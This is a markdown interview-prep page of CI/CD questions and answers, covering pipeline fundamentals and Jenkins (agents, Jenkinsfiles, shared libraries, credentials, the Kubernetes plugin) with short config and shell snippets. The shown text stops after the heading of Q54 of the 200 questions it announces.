# CI/CD — Core Concepts

<!-- DEVOPS-SHACK:HEADER -->
<p align="center">
  <a href="https://www.youtube.com/@devopsshack"><img alt="YouTube DevOps Shack" src="https://img.shields.io/badge/YouTube-DevOps%20Shack-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://www.youtube.com/@shackverse"><img alt="YouTube DevOps Shack Hindi" src="https://img.shields.io/badge/Hindi-@shackverse-FF0000?style=flat-square&logo=youtube&logoColor=white"/></a>
  <a href="https://devopsshack.com"><img alt="devopsshack.com" src="https://img.shields.io/badge/Courses-devopsshack.com-C6FF4D?style=flat-square&labelColor=0B0F1A"/></a>
  <a href="https://www.instagram.com/devopsshack"><img alt="Instagram" src="https://img.shields.io/badge/Instagram-@devopsshack-E4405F?style=flat-square&logo=instagram&logoColor=white"/></a>
  <a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack"><img alt="Original repo" src="https://img.shields.io/badge/Original-DevOps%20Shack%20repo-4DE8FF?style=flat-square&logo=github&labelColor=0B0F1A"/></a>
</p>
<p align="center"><sub>Part of <b><a href="https://github.com/jaiswaladi246/DevOps-Cloud-Interview-Preparation-by-DevOps-Shack">DevOps &amp; Cloud Interview Preparation</a></b> — created by <b><a href="https://www.youtube.com/@devopsshack">DevOps Shack</a></b>. Free to learn from; please credit DevOps Shack when sharing.</sub></p>
<!-- /DEVOPS-SHACK:HEADER -->

> Core concepts, internals and comparisons for Jenkins, GitHub Actions, GitLab CI, build tools, quality gates and deployment strategies · 200 questions · 🟢 Beginner 🟡 Intermediate 🔴 Advanced

[⬅ Back to CI/CD](./README.md) · [🏠 Home](../README.md)

## Table of contents
- [Fundamentals and Pipeline Design](#fundamentals-and-pipeline-design) — Q1–Q25
- [Jenkins](#jenkins) — Q26–Q65
- [GitHub Actions](#github-actions) — Q66–Q110
- [GitLab CI](#gitlab-ci) — Q111–Q135
- [Build Tools and Artifact Repositories](#build-tools-and-artifact-repositories) — Q136–Q160
- [Testing and Quality Gates](#testing-and-quality-gates) — Q161–Q180
- [Deployment Strategies and GitOps](#deployment-strategies-and-gitops) — Q181–Q200

---

## Fundamentals and Pipeline Design

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q1. What is Continuous Integration (CI)? 🟢

<details>
<summary><b>Answer</b></summary>

CI is the practice of merging small changes into a shared branch frequently (at least daily) and having an automated system build and test every change. The goal is to find integration problems within minutes instead of at the end of a sprint.

A CI run typically does: checkout, restore dependencies, compile, run unit tests, lint, and publish a build result. If it fails, fixing it becomes the team's top priority, because a red main branch blocks everybody.

</details>

### Q2. What is the difference between Continuous Delivery and Continuous Deployment? 🟡

<details>
<summary><b>Answer</b></summary>

Both extend CI so that every merged change is automatically built, tested and packaged into a releasable artifact. The difference is the last step:

- **Continuous Delivery**: the artifact is always deployable, but a human (or a business decision) triggers the production release, usually via an approval gate.
- **Continuous Deployment**: every change that passes the pipeline goes to production automatically, with no manual approval.

In production we use continuous deployment for stateless internal services with strong test and rollback automation, and continuous delivery for regulated or customer-visible systems.

</details>

### Q3. What is a CI/CD pipeline and what are its stages? 🟢

<details>
<summary><b>Answer</b></summary>

A pipeline is an automated workflow that takes a commit from source control to a running deployment. It is split into stages, and each stage contains one or more jobs.

A common stage order is: **source/checkout → build → unit test → static analysis → package (image/artifact) → publish → deploy to dev/staging → integration/E2E tests → deploy to production → verify**. A failed stage stops the pipeline, so later (more expensive) stages never run on a broken build.

</details>

### Q4. Why should a pipeline "fail fast", and how do you order stages to achieve it? 🟡

<details>
<summary><b>Answer</b></summary>

Failing fast means developers get feedback in minutes, and you do not burn runner time on expensive stages when a cheap check would have failed.

Order stages by cost and failure likelihood: lint and compile first, then unit tests, then security scans, then image build, and only then slow integration and E2E tests. Run independent cheap checks in parallel, and cancel superseded runs (for example with `concurrency` in GitHub Actions or `interruptible` in GitLab) when a new commit arrives on the same branch.

</details>

### Q5. What makes a build reproducible, and why does it matter? 🔴

<details>
<summary><b>Answer</b></summary>

A reproducible build produces the same output (ideally bit-for-bit identical) from the same source and inputs, no matter when or where it runs. It matters for debugging, rollbacks, audit and supply chain trust (you can verify a binary matches its source).

What breaks it: floating dependency versions, `latest` base images, timestamps embedded in artifacts, build-time network downloads, and differing toolchains on agents. What we do:

- Pin dependencies with lockfiles (`package-lock.json`, `poetry.lock`, `go.sum`) and use `npm ci`.
- Pin base images by digest (`FROM node:22-slim@sha256:...`).
- Run builds in a pinned container image and set `SOURCE_DATE_EPOCH`.
- Prefer hermetic tools such as Bazel or Nix for strict isolation.

</details>

### Q6. How does your branching strategy affect CI? Compare trunk-based development with GitFlow. 🟡

<details>
<summary><b>Answer</b></summary>

CI only works if integration is frequent. **Trunk-based development** uses short-lived branches (hours to a day) merged into `main` with feature flags hiding unfinished work. It fits continuous delivery best and gives the smallest merge conflicts.

**GitFlow** uses long-lived `develop`, `release/*` and `hotfix/*` branches. It adds merge overhead and delays integration, so a "CI" build on `develop` can hide weeks of divergence. It still suits products with versioned, supported releases (installed software, mobile apps).

For most SaaS teams, trunk-based with PR checks plus a merge queue is the faster and safer choice.

</details>

### Q7. What is a build artifact? 🟢

<details>
<summary><b>Answer</b></summary>

An artifact is the immutable output of a build that you later test and deploy: a JAR/WAR, an npm tarball, a Python wheel, a Go binary, a Helm chart, or a container image. It is stored in an artifact repository or registry (Nexus, Artifactory, ECR, GHCR) with a version or digest.

Pipelines pass the same artifact through every environment instead of rebuilding it, so what you tested is exactly what you ship.

</details>

### Q8. Explain "build once, deploy many". Why is rebuilding per environment an anti-pattern? 🟡

<details>
<summary><b>Answer</b></summary>

You build the artifact a single time, tag it with an immutable identifier (commit SHA or image digest), and promote that same artifact through dev, staging and production. Only configuration changes between environments, injected at deploy time (env vars, ConfigMaps, Helm values).

Rebuilding per environment means production runs bits that were never tested, because compilers, dependency resolution or base images may have changed in between. It also makes "it passed in staging" meaningless.

```bash
docker build -t registry.example.com/shop/api:${GIT_SHA} .
docker push registry.example.com/shop/api:${GIT_SHA}
# staging and prod deploy the SAME tag; only values files differ
helm upgrade --install api ./chart -f values-prod.yaml --set image.tag=${GIT_SHA}
```

</details>

### Q9. What is a merge queue and what problem does it solve? 🔴

<details>
<summary><b>Answer</b></summary>

When many PRs are green individually, merging them in sequence can still break `main`, because each PR was tested against an older base ("semantic merge conflict"). A merge queue serialises merges: it builds a temporary branch containing the base plus all queued PRs ahead of yours, runs the required checks on it, and merges only if it passes.

GitHub merge queue needs the workflow to trigger on the `merge_group` event; GitLab has merge trains. Required status checks must run on both `pull_request` and `merge_group`, otherwise the queue stalls waiting for a check that never reports.

```yaml
on:
  pull_request:
  merge_group:
```

</details>

### Q10. What does "pipeline as code" mean? 🟢

<details>
<summary><b>Answer</b></summary>

The pipeline definition lives in the repository as a text file (`Jenkinsfile`, `.github/workflows/*.yml`, `.gitlab-ci.yml`) instead of being clicked together in a UI. This gives you version history, code review, branch-specific pipelines, easy rollback of pipeline changes, and the ability to recreate the CI setup from scratch.

</details>

### Q11. What is the difference between the build, test, release and deploy steps? 🟡

<details>
<summary><b>Answer</b></summary>

- **Build** turns source into an executable form (compile, bundle, `docker build`).
- **Test** verifies behaviour (unit, integration, E2E, security scans).
- **Release** creates a versioned, immutable, publishable artifact and its metadata (tag, changelog, GitHub Release, image push).
- **Deploy** puts a specific release onto an environment.

Keeping release and deploy separate lets you deploy the same release to many places and roll back by redeploying an older release without rebuilding anything.

</details>

### Q12. Webhook trigger vs SCM polling: what is the difference and which do you use? 🟡

<details>
<summary><b>Answer</b></summary>

With **polling**, the CI server asks the repository every N minutes whether anything changed (Jenkins `pollSCM('H/5 * * * *')`). It is simple and works behind firewalls but adds delay and load. With **webhooks**, the SCM calls the CI server's endpoint on push or PR events, giving near-instant builds with no wasted checks.

We use webhooks everywhere they can reach the server (GitHub, GitLab and Bitbucket webhooks to Jenkins' `/github-webhook/` or the Generic Webhook Trigger plugin) and keep a slow poll or a nightly build only as a safety net.

</details>

### Q13. How should pipelines version artifacts, and why are mutable tags like `latest` dangerous? 🔴

<details>
<summary><b>Answer</b></summary>

Artifacts need an identifier that maps back to the source and never changes: the Git SHA (`api:3f9c2ab`), a SemVer tag from a release (`1.14.2`), or the content digest (`@sha256:...`). Often we publish several tags pointing at the same digest: `1.14.2`, `1.14`, and the SHA.

`latest` and other mutable tags break traceability (what is running?), make rollbacks ambiguous, and cause nodes to pull different bits at different times when a tag is repointed. Kubernetes with `imagePullPolicy: IfNotPresent` can even run different versions on different nodes. Deploy by digest or immutable tag, and enable tag immutability in ECR/Artifactory.

</details>

### Q14. What is a CI agent, runner or executor? 🟢

<details>
<summary><b>Answer</b></summary>

It is the machine (VM, container, or pod) that actually executes pipeline jobs, as opposed to the control plane that schedules them. Jenkins calls them agents (nodes), GitHub Actions calls them runners, and GitLab CI calls them runners with an executor type (shell, docker, kubernetes). Keeping builds off the controller protects the scheduler and isolates build tooling.

</details>

### Q15. What does "shift left" mean in CI/CD? 🟡

<details>
<summary><b>Answer</b></summary>

Shift left means moving quality and security checks earlier in the lifecycle, where defects are cheapest to fix. In practice: pre-commit hooks, linters and unit tests on every PR, SAST and secret scanning on the PR, dependency and container scans before the image is pushed, and IaC scanning (Checkov, tfsec) before `terraform apply`.

Shift left does not mean dropping later checks. We still run integration tests, DAST and runtime monitoring after deploy.

</details>

### Q16. How does a pipeline behave as a DAG, and what is the critical path? 🔴

<details>
<summary><b>Answer</b></summary>

Jobs are nodes and dependencies are edges (`needs:` in GitHub Actions and GitLab, `parallel`/`stages` in Jenkins). Jobs with no dependency between them run in parallel; a job starts when all its dependencies succeed.

Total pipeline time equals the **critical path**: the longest chain of dependent jobs. Adding runners will not help if one 20-minute integration job gates everything. To shorten it you split that job, shard tests, or let downstream jobs start earlier. GitLab's `needs:` lets a job skip waiting for the whole previous stage.

```yaml
jobs:
  lint:   { runs-on: ubuntu-latest, steps: [...] }
  test:   { runs-on: ubuntu-latest, steps: [...] }
  build:  { needs: [lint, test], runs-on: ubuntu-latest, steps: [...] }
```

</details>

### Q17. What are environments in a delivery pipeline and how do changes get promoted through them? 🟡

<details>
<summary><b>Answer</b></summary>

Typical environments are dev, QA/test, staging (production-like), and production. Promotion means deploying the same artifact to the next environment after gates pass: automated tests, smoke checks, security sign-off, or manual approval.

Staging should mirror production in topology, config shape and data volume as closely as budget allows, otherwise passing there proves little. Each environment gets its own credentials, and production credentials are only available to the production deploy job.

</details>

### Q18. What are required status checks and branch protection, and how do they relate to CI? 🟢

<details>
<summary><b>Answer</b></summary>

Branch protection (GitHub) or protected branches (GitLab) enforce rules on `main`: no direct pushes, PR review required, and specified CI jobs must pass before merge. These are the **required status checks**. They turn CI from advice into a gate: a red build cannot be merged.

Check names must match exactly the job names reported to the PR. If you rename a job, update the protection rule or merges will wait forever.

</details>

### Q19. How does CI work for a monorepo versus many repos? 🟡

<details>
<summary><b>Answer</b></summary>

In a monorepo, running everything on every commit is wasteful. You need change detection: path filters (`on.push.paths`, GitLab `rules:changes`), or a build graph tool (Bazel, Nx, Turborepo) that computes affected projects and caches results remotely.

With polyrepo, each repo has its own simple pipeline, but cross-service changes need coordinated PRs and shared pipeline logic must be distributed via shared libraries, reusable workflows or templates.

```yaml
on:
  pull_request:
    paths:
      - 'services/payments/**'
      - '.github/workflows/payments.yml'
```

A gotcha: with required checks, a path-filtered workflow that does not run leaves the check pending. Use a final "gate" job that always runs.

</details>

### Q20. Compare ephemeral and long-lived static build agents. 🔴

<details>
<summary><b>Answer</b></summary>

**Ephemeral** agents (a fresh VM or pod per job) give clean, reproducible environments, no state leakage between jobs, and no leftover credentials. They scale to zero and limit blast radius if a job is compromised. The cost is cold starts and no warm caches, which you solve with remote caches or registry-based layer caches.

**Static** agents keep warm caches and are fast, but accumulate disk junk, drift in tool versions ("works on agent-3"), and can leak secrets or poisoned caches between builds, which is a real supply-chain risk, especially for self-hosted runners on public repos.

We run ephemeral agents (Jenkins Kubernetes plugin, GitHub ARC, GitLab Kubernetes executor) and use caches deliberately.

</details>

### Q21. What is a rollback in CD? 🟢

<details>
<summary><b>Answer</b></summary>

A rollback returns production to a previously known-good release after a bad deployment. With immutable artifacts it is just a redeploy of the older version (`kubectl rollout undo deployment/api`, `helm rollback api 12`, or re-running the deploy job with the previous tag). It only works cleanly if the old version is still compatible with the current database schema and external contracts.

</details>

### Q22. What do pipeline caches do, and how do they differ from artifacts? 🟡

<details>
<summary><b>Answer</b></summary>

A **cache** speeds up later runs by reusing downloaded or computed data (npm modules, Maven `~/.m2`, Docker layers). It is best-effort: a miss must never change the outcome, only the speed. Keys are derived from lockfiles, for example `hashFiles('**/package-lock.json')`.

An **artifact** is a specific output of one run that later jobs (or people) depend on, such as a built binary or a test report. Artifacts are guaranteed to be passed on within the pipeline; caches are not. Never put anything in a cache that the pipeline's correctness depends on.

</details>

### Q23. Why do teams build container images in CI? 🟢

<details>
<summary><b>Answer</b></summary>

A container image bundles the app with its runtime and dependencies, so the same artifact runs on a laptop, in staging and in production. CI builds the image once on each merge, scans it, tags it with the commit SHA, and pushes it to a registry from where Kubernetes or ECS pulls it.

</details>

### Q24. What is the difference between deployment and release, and how do feature flags help? 🟡

<details>
<summary><b>Answer</b></summary>

**Deployment** is putting code on production infrastructure. **Release** is making a feature available to users. Feature flags decouple them: you deploy code dark (flag off), then enable it for staff, then 1%, then everyone, and turn it off instantly without a redeploy if something is wrong.

This lets you deploy many times a day with small, low-risk changes while product decides the release time. The cost is flag hygiene: stale flags become technical debt and must be removed.

</details>

### Q25. How do you handle database migrations in a CD pipeline? 🔴

<details>
<summary><b>Answer</b></summary>

Migrations must be backward compatible with the currently running app version, because during rolling, blue-green or canary deployments old and new code run against the same database. Use the **expand/contract** pattern:

1. Expand: add new nullable columns or tables (old code ignores them).
2. Deploy code that writes both and reads the new one.
3. Backfill data.
4. Contract: drop the old column in a later release once no code uses it.

Run migrations as a dedicated pipeline step or a Kubernetes Job/Helm pre-upgrade hook using Flyway, Liquibase, Alembic or Rails migrations, never from many app replicas starting at once. Never ship a destructive migration in the same release as the code that stops needing it.

```bash
flyway -url=jdbc:postgresql://db:5432/app -user=$DB_USER -password=$DB_PASS migrate
```

</details>

## Jenkins

<!-- DEVOPS-SHACK:SECTION -->
> 🎥 **Learn this hands-on with DevOps Shack** → [YouTube @devopsshack](https://www.youtube.com/@devopsshack) · [Hindi @shackverse](https://www.youtube.com/@shackverse) · [Courses at devopsshack.com](https://devopsshack.com)

### Q26. What is Jenkins and how is its architecture organised? 🟢

<details>
<summary><b>Answer</b></summary>

Jenkins is an open-source automation server written in Java. It uses a **controller** (formerly "master") that stores configuration, schedules jobs, serves the UI and holds build history, and **agents** (nodes) that execute the build steps. Jobs run in executors on agents. Plugins add SCM support, build steps, credentials stores, cloud agent provisioning and more.

Jenkins home (`JENKINS_HOME`, usually `/var/lib/jenkins`) holds jobs, credentials, plugins and `config.xml`; backing it up is backing up Jenkins.

</details>

### Q27. What are executors, nodes and labels in Jenkins? 🟡

<details>
<summary><b>Answer</b></summary>

A **node** is a machine (the controller or an agent) that can run builds. An **executor** is a slot on a node that runs one build at a time; a node with 4 executors runs 4 concurrent builds. **Labels** are tags on nodes (`linux`, `docker`, `gpu`) that pipelines select with `agent { label 'docker' }`, so jobs land on suitable machines.

We set the controller to 0 executors so builds never run on it.

</details>

### Q28. Why should you not run builds on the Jenkins controller? 🟢

<details>
<summary><b>Answer</b></summary>

The controller holds credentials, job configuration and the scheduler. A build running there executes arbitrary code with access to `JENKINS_HOME`, so a malicious or buggy Jenkinsfile can read secrets or crash the whole server. Heavy builds also starve the UI and scheduler. Set "Number of executors" to 0 on the built-in node and run everything on agents.

</details>

### Q29. How do inbound (JNLP/WebSocket) and SSH agents connect to the controller? 🟡

<details>
<summary><b>Answer</b></summary>

**SSH agents**: the controller initiates an SSH connection to the agent host, copies `agent.jar` and starts it. Requires network reach from controller to agent.

**Inbound agents**: the agent starts `java -jar agent.jar` and connects to the controller. Two transports exist: the classic TCP port (set a fixed "TCP port for inbound agents") and **WebSocket**, which tunnels over the normal HTTP(S) port and is easier through proxies and ingress. Inbound is what the Kubernetes plugin uses for pod agents.

```bash
java -jar agent.jar -url https://jenkins.example.com/ -name build-01 \
  -secret @secret-file -webSocket -workDir /home/jenkins/agent
```

</details>

### Q30. What is a Jenkinsfile and where does it live? 🟢

<details>
<summary><b>Answer</b></summary>

A Jenkinsfile is a text file that defines a Jenkins Pipeline in Groovy-based DSL. It lives in the root of the repository (by convention) and is picked up by Pipeline-from-SCM or multibranch jobs. Because it is versioned with the code, each branch can have its own pipeline.

</details>

### Q31. Declarative versus Scripted Pipeline: what are the differences? 🟡

<details>
<summary><b>Answer</b></summary>

**Declarative** has a fixed structure (`pipeline { agent, stages, steps, post }`), built-in options (`when`, `parallel`, `post`, `options`), syntax validation before running, and is easier to read and lint. **Scripted** is a `node { }` block of full Groovy, offering unlimited flexibility (loops, try/catch, dynamic stages) but with no structural validation and more ways to write unmaintainable code.

Our rule is declarative by default, with a `script { }` block for the occasional dynamic bit, and complex logic moved into a shared library.

```groovy
pipeline {
  agent { label 'linux' }
  stages {
    stage('Build') { steps { sh 'mvn -B -DskipTests package' } }
    stage('Test')  { steps { sh 'mvn -B test' } }
  }
  post { always { junit 'target/surefire-reports/*.xml' } }
}
```

</details>

### Q32. What does the `post` section in a declarative pipeline do? 🟢

<details>
<summary><b>Answer</b></summary>

`post` defines actions that run after the stages (or a stage) based on the result. Conditions include `always`, `success`, `failure`, `unstable`, `changed`, `fixed`, `regression`, `aborted` and `cleanup`. Typical uses: publish test reports, send Slack/email notifications, archive logs, and clean the workspace. `cleanup` runs last, after every other post condition.

```groovy
post {
  always  { junit '**/target/surefire-reports/*.xml' }
  failure { slackSend channel: '#ci', message: "FAILED ${env.JOB_NAME} #${env.BUILD_NUMBER}" }
  cleanup { cleanWs() }
}
```

</details>

### Q33. How do `agent` directives work (any, none, label, docker, kubernetes)? 🟡

<details>
<summary><b>Answer</b></summary>

`agent` says where a pipeline or stage runs. `agent any` uses any available node. `agent none` at the top means no global agent, so each stage must declare its own (useful to avoid holding an executor during an `input` wait). `agent { label 'x' }` selects by label. `agent { docker { image 'maven:3.9-eclipse-temurin-21' } }` runs steps in a container on a Docker-capable node. `agent { kubernetes { yaml '...' } }` creates a pod from a spec.

```groovy
pipeline {
  agent none
  stages {
    stage('Build') {
      agent { docker { image 'node:22' args '-v $HOME/.npm:/root/.npm' } }
      steps { sh 'npm ci && npm run build' }
    }
  }
}
```

</details>

### Q34. How does the `when` directive control stage execution? 🟡

<details>
<summary><b>Answer</b></summary>

`when` is evaluated before a stage runs and skips it if false. Common conditions: `branch 'main'`, `tag 'v*'`, `changeRequest()`, `environment name: 'DEPLOY', value: 'true'`, `expression { ... }`, `changeset 'src/**'`, plus `allOf`, `anyOf`, `not`. By default `when` is evaluated after the stage's `agent` is allocated; add `beforeAgent true` to evaluate it first and avoid spinning up an agent for a skipped stage.

```groovy
stage('Deploy') {
  when { beforeAgent true; branch 'main' }
  agent { label 'deployer' }
  steps { sh './deploy.sh' }
}
```

</details>

### Q35. How do you run stages in parallel in a Jenkins declarative pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

Use a `parallel` block inside a stage. Each child stage can have its own agent. Add `failFast true` so the other branches abort when one fails.

```groovy
stage('Tests') {
  failFast true
  parallel {
    stage('Unit')        { steps { sh 'make unit' } }
    stage('Integration') { agent { label 'docker' } steps { sh 'make integration' } }
    stage('Lint')        { steps { sh 'make lint' } }
  }
}
```

Parallel branches compete for executors, so more parallelism only helps if agents are available.

</details>

### Q36. What are Jenkins Shared Libraries and why use them? 🔴

<details>
<summary><b>Answer</b></summary>

A shared library is a Git repository of Groovy code that many Jenkinsfiles load, so common pipeline logic is written and fixed once. Layout: `vars/` holds global steps (`vars/buildImage.groovy` becomes the step `buildImage`), `src/` holds regular Groovy classes, `resources/` holds static files loaded with `libraryResource`.

You configure it under Manage Jenkins > System > Global Pipeline Libraries (or at folder level), then load it with `@Library('ci-lib@v2.3.0') _`. Pin to tags in production so a library change cannot break every pipeline at once.

```groovy
// vars/buildImage.groovy
def call(Map cfg) {
  sh "docker build -t ${cfg.name}:${cfg.tag} ."
  sh "docker push ${cfg.name}:${cfg.tag}"
}
```

</details>

### Q37. How do you use credentials in a Jenkinsfile safely? 🟡

<details>
<summary><b>Answer</b></summary>

Store secrets in the Jenkins Credentials store (types: Secret text, Username with password, SSH key, Secret file, Certificate) and bind them at runtime with `credentials()` in `environment` or `withCredentials`. Jenkins masks bound values in the console log.

```groovy
environment { AWS = credentials('aws-deploy') }   // sets AWS_USR and AWS_PSW
steps {
  withCredentials([string(credentialsId: 'sonar-token', variable: 'SONAR_TOKEN')]) {
    sh 'mvn sonar:sonar -Dsonar.token=$SONAR_TOKEN'
  }
}
```

Use single quotes for `sh` so the shell expands the variable, not Groovy. Groovy string interpolation of secrets leaks them into the process list and warnings.

</details>

### Q38. What are the Jenkins credential scopes and domains? 🔴

<details>
<summary><b>Answer</b></summary>

Scope controls visibility: **System** credentials are usable by Jenkins itself (agent connections, email) but not by jobs; **Global** credentials are usable by any job. Credentials can also be defined at folder level (or on a user), making them visible only to jobs in that folder, which is the main tool for tenant isolation. **Domains** restrict a credential to specific hostnames or URL patterns for plugins that support it.

Use folders plus folder-scoped credentials and Role-Based Authorization or Folder Authorization so team A cannot bind team B's deployment credentials.

</details>

### Q39. What are the main Jenkins project types (Freestyle, Pipeline, Multibranch, Organization Folder)? 🟡

<details>
<summary><b>Answer</b></summary>

- **Freestyle**: UI-configured steps; legacy, hard to version.
- **Pipeline**: a single job defined by a Jenkinsfile (inline or from SCM).
- **Multibranch Pipeline**: scans a repo and auto-creates a job per branch, PR and tag that contains a Jenkinsfile; deletes jobs when branches vanish.
- **Organization Folder**: scans a whole GitHub org or Bitbucket project and creates a multibranch job per repo with a Jenkinsfile.

We use Organization Folders so new repos get CI just by adding a Jenkinsfile.

</details>

### Q40. How does Jenkins decide which Jenkinsfile and agent to use in a multibranch job? 🔴

<details>
<summary><b>Answer</b></summary>

Branch Sources (GitHub, GitLab, Git) discover branches, PRs and tags. For each one, Jenkins checks out a lightweight view of the repo, looks for the path set in "Script Path" (default `Jenkinsfile`), and creates a child job if found. The Jenkinsfile loaded is the one from that branch/PR head. For PRs from forks, trust strategies decide whose Jenkinsfile is used: "Trust contributors" runs the PR's version, while "Trust nobody" uses the target branch's, preventing a fork from modifying the pipeline to steal credentials.

Scanning happens on a schedule or webhook, and "Orphaned item strategy" controls how long stale branch jobs are kept.

</details>

### Q41. What is the Jenkins plugin system and what are its risks? 🟡

<details>
<summary><b>Answer</b></summary>

Almost all Jenkins functionality comes from plugins (`.hpi` files in `JENKINS_HOME/plugins`), installed via the Plugin Manager or `jenkins-plugin-cli`. Plugins can add steps, UI, credentials providers and cloud integrations.

The risks are security vulnerabilities (Jenkins publishes advisories regularly), compatibility breaks between core and plugin versions, and abandoned plugins. We pin plugin versions in a `plugins.txt`, test upgrades on a staging controller, and remove unused plugins.

```bash
jenkins-plugin-cli --plugin-file /usr/share/jenkins/ref/plugins.txt
# plugins.txt:  workflow-aggregator:latest  git:5.7.0  kubernetes:4358.v...
```

</details>

### Q42. What does `sh` vs `bat` vs `powershell` do, and what are common `sh` options? 🟢

<details>
<summary><b>Answer</b></summary>

`sh` runs a shell script on Unix agents, `bat` on Windows cmd, and `powershell`/`pwsh` for PowerShell. `sh` defaults to `-xe`, so commands are echoed and the script stops at the first failing command. Useful options are `returnStdout: true` to capture output, `returnStatus: true` to get the exit code without failing the build, and `label` to name the step in the UI.

```groovy
def sha = sh(script: 'git rev-parse --short HEAD', returnStdout: true).trim()
```

</details>

### Q43. How do `input` steps and manual approvals work in Jenkins? 🟡

<details>
<summary><b>Answer</b></summary>

The `input` step pauses the pipeline until a user clicks Proceed or Abort, optionally restricted to specific users via `submitter` and optionally collecting parameters. Put it inside a stage with `agent none` or after leaving the node block; otherwise the pipeline holds an executor while waiting. Add a `timeout` so abandoned pipelines do not hang forever.

```groovy
stage('Approve') {
  agent none
  steps {
    timeout(time: 2, unit: 'HOURS') {
      input message: 'Deploy to production?', submitter: 'release-managers'
    }
  }
}
```

</details>

### Q44. What are Jenkins build triggers and how do cron expressions with `H` work? 🟡

<details>
<summary><b>Answer</b></summary>

Triggers include SCM webhook (GitHub hook trigger), `pollSCM`, `cron`, upstream job completion, and remote HTTP trigger with a token. The `H` symbol hashes the job name to pick a stable offset, spreading load instead of firing every job at minute 0. `H/15 * * * *` means every 15 minutes at a job-specific offset; `H 2 * * 1-5` means once between 02:00 and 02:59 on weekdays.

```groovy
triggers { cron('H 2 * * 1-5') }
```

</details>

### Q45. What is the difference between `stash/unstash` and `archiveArtifacts`? 🟡

<details>
<summary><b>Answer</b></summary>

`stash` saves files temporarily to the controller during a run so another stage on a different agent can `unstash` them; stashes disappear when the build ends and should be small. `archiveArtifacts` stores files permanently with the build record so people and other jobs can download them later. For anything large, use an artifact repository or object storage rather than either, because both route data through the controller.

```groovy
stash name: 'jar', includes: 'target/*.jar'
// later, on another agent
unstash 'jar'
archiveArtifacts artifacts: 'target/*.jar', fingerprint: true
```

</details>

### Q46. How do parameters work in a Jenkins pipeline? 🟢

<details>
<summary><b>Answer</b></summary>

The `parameters` directive adds a "Build with Parameters" form: `string`, `booleanParam`, `choice`, `password`, `text`. Values are available as `params.NAME` and as environment variables. On the first run of a branch the parameters are not yet registered, which is a known gotcha.

```groovy
parameters {
  choice(name: 'ENV', choices: ['dev', 'staging', 'prod'], description: 'Target')
  booleanParam(name: 'RUN_E2E', defaultValue: true)
}
// usage: echo "Deploying to ${params.ENV}"
```

</details>

### Q47. What does `options { }` do in a declarative pipeline? 🟡

<details>
<summary><b>Answer</b></summary>

`options` sets pipeline-level behaviour. The ones I use on every pipeline: `timeout`, `buildDiscarder`, `disableConcurrentBuilds`, `timestamps`, `skipDefaultCheckout`, and `retry`.

```groovy
options {
  timeout(time: 30, unit: 'MINUTES')
  buildDiscarder(logRotator(numToKeepStr: '30', artifactNumToKeepStr: '5'))
  disableConcurrentBuilds(abortPrevious: true)
  timestamps()
}
```

Without `buildDiscarder` the controller disk eventually fills with old builds.

</details>

### Q48. What is the Groovy sandbox and script approval in Jenkins? 🔴

<details>
<summary><b>Answer</b></summary>

Pipeline Groovy runs in a **sandbox** that only allows a whitelist of safe methods. When a Jenkinsfile calls something outside the whitelist, the build fails with `RejectedAccessException: Scripts not permitted to use method ...` and an administrator must approve the signature under Manage Jenkins > In-process Script Approval.

Trusted shared libraries (configured globally, not "load implicitly from SCM for untrusted users") run outside the sandbox, which is why only admins should be able to change them. Approving dangerous signatures like `Runtime.exec` effectively gives the pipeline author control of the controller JVM.

</details>

### Q49. What is the CPS (Continuation Passing Style) execution model and why does it matter? 🔴

<details>
<summary><b>Answer</b></summary>

Pipeline Groovy is transformed by the CPS engine so a running pipeline can be serialised to disk and survive a controller restart. Consequences: all local variables must be `Serializable` or you get `java.io.NotSerializableException`; some Groovy features (closures in `.each`, `.collect`, `sort` with comparators) behave oddly or fail; and CPS code runs slower than plain Groovy.

Mitigations: use `@NonCPS` on helper methods that need non-serialisable objects (they cannot call pipeline steps), prefer simple `for` loops over `.each`, and push heavy logic into shell scripts or a shared library class.

</details>

### Q50. What is a Jenkins pipeline durability setting? 🔴

<details>
<summary><b>Answer</b></summary>

Durability controls how often the pipeline's state is flushed to disk. `MAX_SURVIVABILITY` (default) writes on every step so a restart resumes the build exactly; `SURVIVABLE_NONATOMIC` and `PERFORMANCE_OPTIMIZED` write less, which cuts disk I/O significantly for pipelines with many steps but means a controller crash or hard restart can fail running builds.

```groovy
options { durabilityHint('PERFORMANCE_OPTIMIZED') }
```

We use performance-optimised for fast CI jobs on busy controllers, and keep the default for long-running release pipelines.

</details>

### Q51. How does the Jenkins Kubernetes plugin provision agents? 🔴

<details>
<summary><b>Answer</b></summary>

When a build needs an agent matching a pod template, the plugin calls the Kubernetes API to create a pod. The pod contains a `jnlp` container (the inbound agent that connects back to the controller) plus any extra containers you define (maven, docker/kaniko, kubectl). Steps run in a chosen container using `container('name') { ... }`, sharing the workspace volume. When the build finishes, the pod is deleted.

```groovy
agent {
  kubernetes {
    yaml '''
    spec:
      containers:
      - name: maven
        image: maven:3.9-eclipse-temurin-21
        command: [sleep]
        args: [infinity]
    '''
  }
}
// steps { container('maven') { sh 'mvn -B verify' } }
```

</details>

### Q52. What is Jenkins Configuration as Code (JCasC)? 🟡

<details>
<summary><b>Answer</b></summary>

JCasC defines the controller's configuration (security realm, authorization, credentials, clouds, global libraries, tool installations) in YAML so a controller can be rebuilt reproducibly and changes are reviewed in Git. The plugin reads the file pointed to by `CASC_JENKINS_CONFIG` at startup. Secrets are referenced as `${SECRET_NAME}` and resolved from env vars, files or a vault.

```yaml
jenkins:
  systemMessage: "Managed by JCasC"
  numExecutors: 0
  securityRealm:
    local:
      allowsSignup: false
```

</details>

### Q53. How do you trigger one Jenkins job from another and pass data? 🟢

<details>
<summary><b>Answer</b></summary>

Use the `build` step. `wait: true` (default) blocks until the downstream finishes; `propagate: false` stops a downstream failure from failing the caller.

```groovy
def result = build job: 'deploy-app', parameters: [
  string(name: 'VERSION', value: env.GIT_COMMIT)
], wait: true
echo "Downstream: ${result.result}"
```

For complex flows, we prefer a single pipeline with stages over chains of jobs, since job chains are hard to follow and reproduce.

</details>

### Q54. What does `retry`, `timeout` and `catchError` do in a pipeline? 🟡

<details>
